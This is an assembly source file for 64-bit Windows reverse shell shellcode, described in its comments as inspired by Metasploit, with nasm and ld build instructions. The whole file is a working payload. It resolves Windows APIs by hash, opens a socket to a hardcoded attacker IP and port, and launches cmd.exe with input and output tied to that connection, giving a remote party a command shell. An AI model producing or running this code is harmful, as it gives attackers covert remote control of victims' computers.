;this is 64bit asm reverse shell asm shellcode 
;inspired by metasploit shellcode
;compile it like: nasm -f win64 name.asm
;link it like: ld new.obj -o new.exe

global _start
_start:

section .text
sub rsp, 0x8   
call starting
push r9		;
push r8
push rdx
push rcx
push rsi
xor rdx,rdx
mov rdx,qword  gs:[rdx+0x60]
mov rdx,qword  [rdx+0x18]
mov rdx,qword  [rdx+0x20]
findaddr:
push rdx
push r9
mov rdx,qword  [rdx+0x20]
mov eax,dword  [rdx+0x3C]
add rax,rdx
mov eax,dword  [rax+0x88]
test rax,rax
je skip1
add rax,rdx
push rax
mov ecx,dword  [rax+0x18]
mov r8d,dword  [rax+0x20]
add r8,rdx
outloop:
jrcxz skip			
dec rcx
mov esi,dword  [r8+rcx*0x4]
add rsi,rdx
xor r9,r9
inloop:
xor rax,rax
lodsb 
ror r9d,0xD
add r9d,eax
cmp al,ah
jne inloop 			
cmp r9d,r10d
jne outloop
pop rax
mov r8d,dword [rax+0x24]
add r8,rdx
mov cx,word  [r8+rcx*2]
mov r8d,dword  [rax+0x1C]
add r8,rdx
mov eax,dword  [r8+rcx*4]
add rax,rdx
pop r8
pop r8
pop rsi
pop rcx
pop rdx
pop r8
pop r9
ret
skip:
pop rax
skip1:
pop r9
pop rdx
mov rdx,qword  [rdx] 
jmp findaddr
starting:
pop rbp
mov r10d,0x74776072     
call rbp		;finding LoadLibrary
mov r14,0x32335F327377
push r14
mov r14,rsp
sub rsp,0x1A0
mov r13,rsp
mov r12,0x761DA8C05C110002     ;here the ip port are storeed
push r12 
mov r12,rsp       ; r12 pointing to the ip port
mov rcx,r14
sub rsp, 0x20
call rax			

mov r10d,0x6e59dfe7     
call rbp		;finding WSAstartup
mov rdx,r13
push 0x101
pop rcx
sub rsp, 0x20       
call rax
mov rcx,rax
mov r10d,0x4ecd6fa8   ;finding WSAsocketA
call rbp
push rcx
push rcx
xor r9,r9
xor r8,r8
inc rbx
mov rdx,rbx
inc rbx
mov rcx,rbx
sub rsp, 0x20
call rax    ; calling wsasocketA
mov rdi,rax			
mov r10d,0xCF630557
call rbp		;find connect
push 0x10
pop r8
mov rdx,r12
mov rcx,rdi
sub rsp, 0x20	
call rax	;call connect	 
mov r10d,0xf390b59f
call rbp ; find createprocessa
mov r13, rax   
add rsp,0x240
mov r8,0x646D63
push r8
push r8
mov rdx,rsp
push rdi
push rdi
push rdi
xor r8,r8
push 0xD
pop rcx
ing:
push r8
loop ing
mov word  [rsp+0x54],0x101
lea rax,qword  [rsp+0x18]
mov byte  [rax],0x68
mov rsi,rsp
push rsi
push rax
push r8
push r8
push r8
inc r8
push r8
dec r8
mov r9,r8
mov rcx,r8
sub rsp, 0x20
call r13 ;call createprocessa
